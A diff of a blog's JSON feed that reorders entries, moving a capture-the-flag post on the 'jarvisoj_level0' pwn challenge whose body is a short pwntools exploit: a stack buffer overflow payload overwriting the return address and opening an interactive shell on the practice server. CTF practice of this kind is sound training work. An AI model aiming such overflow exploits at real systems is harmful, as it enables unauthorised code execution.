@@ -64,6 +64,17 @@
             ]
         },
         {
+            "id": "http://jexy-kynner.github.io/2024/06/01/BUU_jarvisoj_level0/",
+            "url": "http://jexy-kynner.github.io/2024/06/01/BUU_jarvisoj_level0/",
+            "title": "BUU_jarvisoj_level0",
+            "date_published": "2024-05-31T16:50:47.000Z",
+            "content_html": "<h1 id=\"jarvisoj_level0\"><a class=\"anchor\" href=\"#jarvisoj_level0\">#</a> jarvisoj_level0</h1>\n<p><img data-src=\"https://s2.loli.net/2024/06/02/jg9iPpUSV85fdMC.jpg\" alt=\"\" /><br />\n<img data-src=\"https://s2.loli.net/2024/06/02/B4wyUVYizlQnLH8.jpg\" alt=\"\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span>'node5<span class=\"token punctuation\">.</span>buuoj<span class=\"token punctuation\">.</span>cn'<span class=\"token punctuation\">,</span><span class=\"token number\">27244</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    payload<span class=\"token operator\">=</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40059A</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
+            "tags": [
+                "BUU",
+                "刷题"
+            ]
+        },
+        {
             "id": "http://jexy-kynner.github.io/2024/06/01/BUU_ciscn_2019_n_1/",
             "url": "http://jexy-kynner.github.io/2024/06/01/BUU_ciscn_2019_n_1/",
             "title": "BUU_ciscn_2019_n_1",
@@ -72,17 +83,6 @@
             "tags": [
                 "Pwn",
                 "stack",
-                "刷题"
-            ]
-        },
-        {
-            "id": "http://jexy-kynner.github.io/2024/06/01/BUU_jarvisoj_level0/",
-            "url": "http://jexy-kynner.github.io/2024/06/01/BUU_jarvisoj_level0/",
-            "title": "BUU_jarvisoj_level0",
-            "date_published": "2024-05-31T16:50:47.000Z",
-            "content_html": "<h1 id=\"jarvisoj_level0\"><a class=\"anchor\" href=\"#jarvisoj_level0\">#</a> jarvisoj_level0</h1>\n<p><img data-src=\"https://s2.loli.net/2024/06/02/jg9iPpUSV85fdMC.jpg\" alt=\"\" /><br />\n<img data-src=\"https://s2.loli.net/2024/06/02/B4wyUVYizlQnLH8.jpg\" alt=\"\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span>'node5<span class=\"token punctuation\">.</span>buuoj<span class=\"token punctuation\">.</span>cn'<span class=\"token punctuation\">,</span><span class=\"token number\">27244</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    payload<span class=\"token operator\">=</span>b<span class=\"token char\">'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40059A</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
-            "tags": [
-                "BUU",
                 "刷题"
             ]
         },
